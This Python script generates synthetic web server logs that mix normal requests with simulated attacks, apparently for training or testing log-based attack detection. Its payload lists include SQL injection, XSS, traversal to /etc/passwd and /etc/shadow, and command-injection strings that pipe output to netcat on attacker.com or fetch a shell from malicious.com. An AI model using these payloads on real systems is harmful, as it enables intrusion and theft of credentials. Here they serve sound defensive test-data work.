import random
import time
from datetime import datetime
import threading

class LogGenerator:
    def __init__(self, log_file="server_logs.txt"):
        self.log_file = log_file
        self.running = False
        
        # Normal endpoints
        self.normal_endpoints = [
            "/index.html", "/about.html", "/contact.html", "/products.html",
            "/api/users", "/api/products", "/login", "/dashboard",
            "/css/style.css", "/js/app.js", "/images/logo.png"
        ]
        
        # Attack patterns
        self.sql_injection = [
            "/login?user=admin' OR '1'='1",
            "/search?q=' UNION SELECT * FROM users--",
            "/api/user?id=1' DROP TABLE users--",
            "/product?id=1 AND 1=1",
            "/login?user=admin'/**/OR/**/1=1--"
        ]
        
        self.xss_attacks = [
            "/search?q=<script>alert('XSS')</script>",
            "/comment?text=<img src=x onerror=alert(1)>",
            "/profile?name=<svg/onload=alert('XSS')>",
            "/page?input=javascript:alert(document.cookie)"
        ]
        
        self.path_traversal = [
            "/file?name=../../../etc/passwd",
            "/download?file=../../config/database.yml",
            "/view?path=....//....//etc/shadow"
        ]
        
        self.command_injection = [
            "/ping?host=127.0.0.1;cat /etc/passwd",
            "/exec?cmd=ls -la | nc attacker.com 4444",
            "/run?command=whoami && wget malicious.com/shell"
        ]
        
        self.status_codes = {
            "normal": [200, 200, 200, 200, 304, 301, 302],
            "suspicious": [400, 401, 403, 404, 500, 503]
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "python-requests/2.28.0",
            "sqlmap/1.6",
            "Nikto/2.1.6"
        ]
    
    def generate_ip(self, attack=False):
        """Generate IP address - suspicious IPs for attacks"""
        if attack and random.random() > 0.3:
            # Reuse certain IPs for attacks to simulate real attack patterns
            return random.choice([
                "192.168.1.100", "10.0.0.50", "172.16.0.25",
                "203.0.113.45", "198.51.100.88"
            ])
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
    
    def generate_timestamp(self):
        """Generate Apache-style timestamp"""
        now = datetime.now()
        return now.strftime("[%d/%b/%Y:%H:%M:%S +0500]")
    
    def generate_log_entry(self, attack_type=None):
        """Generate a single log entry"""
        if attack_type == "sqli":
            ip = self.generate_ip(attack=True)
            endpoint = random.choice(self.sql_injection)
            status = random.choice([400, 403, 500])
            size = random.randint(500, 2000)
            method = "GET"
        elif attack_type == "xss":
            ip = self.generate_ip(attack=True)
            endpoint = random.choice(self.xss_attacks)
            status = random.choice([200, 400, 403])
            size = random.randint(800, 3000)
            method = "GET"
        elif attack_type == "ddos":
            ip = self.generate_ip(attack=True)
            endpoint = random.choice(self.normal_endpoints)
            status = random.choice([200, 503, 429])
            size = random.randint(100, 1000)
            method = random.choice(["GET", "POST"])
        elif attack_type == "path_traversal":
            ip = self.generate_ip(attack=True)
            endpoint = random.choice(self.path_traversal)
            status = random.choice([400, 403, 404])
            size = random.randint(300, 1500)
            method = "GET"
        elif attack_type == "command_injection":
            ip = self.generate_ip(attack=True)
            endpoint = random.choice(self.command_injection)
            status = random.choice([400, 500])
            size = random.randint(400, 2000)
            method = "POST"
        else:
            # Normal traffic
            ip = self.generate_ip()
            endpoint = random.choice(self.normal_endpoints)
            status = random.choice(self.status_codes["normal"])
            size = random.randint(1000, 50000)
            method = random.choice(["GET", "POST", "PUT", "DELETE"])
        
        timestamp = self.generate_timestamp()
        log_entry = f'{ip} - - {timestamp} "{method} {endpoint} HTTP/1.1" {status} {size}\n'
        return log_entry
    
    def generate_logs(self):
        """Continuously generate logs"""
        print(f"[*] Starting log generation... Writing to {self.log_file}")
        
        while self.running:
            # Randomly decide what type of log to generate
            rand = random.random()
            
            if rand < 0.60:  # 60% normal traffic
                log = self.generate_log_entry()
                time.sleep(random.uniform(0.1, 0.5))
            elif rand < 0.70:  # 10% SQL injection
                log = self.generate_log_entry("sqli")
                time.sleep(random.uniform(0.05, 0.2))
            elif rand < 0.80:  # 10% XSS
                log = self.generate_log_entry("xss")
                time.sleep(random.uniform(0.05, 0.2))
            elif rand < 0.85:  # 5% Path Traversal
                log = self.generate_log_entry("path_traversal")
                time.sleep(random.uniform(0.05, 0.2))
            elif rand < 0.90:  # 5% Command Injection
                log = self.generate_log_entry("command_injection")
                time.sleep(random.uniform(0.05, 0.2))
            else:  # 10% DDoS (rapid requests)
                # Generate burst of requests
                for _ in range(random.randint(15, 25)):
                    log = self.generate_log_entry("ddos")
                    with open(self.log_file, "a") as f:
                        f.write(log)
                    time.sleep(0.01)  # Very fast requests
                continue
            
            # Write log to file
            with open(self.log_file, "a") as f:
                f.write(log)
    
    def start(self):
        """Start log generation in background thread"""
        self.running = True
        self.thread = threading.Thread(target=self.generate_logs, daemon=True)
        self.thread.start()
    
    def stop(self):
        """Stop log generation"""
        self.running = False
        if hasattr(self, 'thread'):
            self.thread.join()

if __name__ == "__main__":
    generator = LogGenerator()
    generator.start()
    
    try:
        print("[*] Log generator running. Press Ctrl+C to stop...")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping log generator...")
        generator.stop()
        print("[*] Log generator stopped.")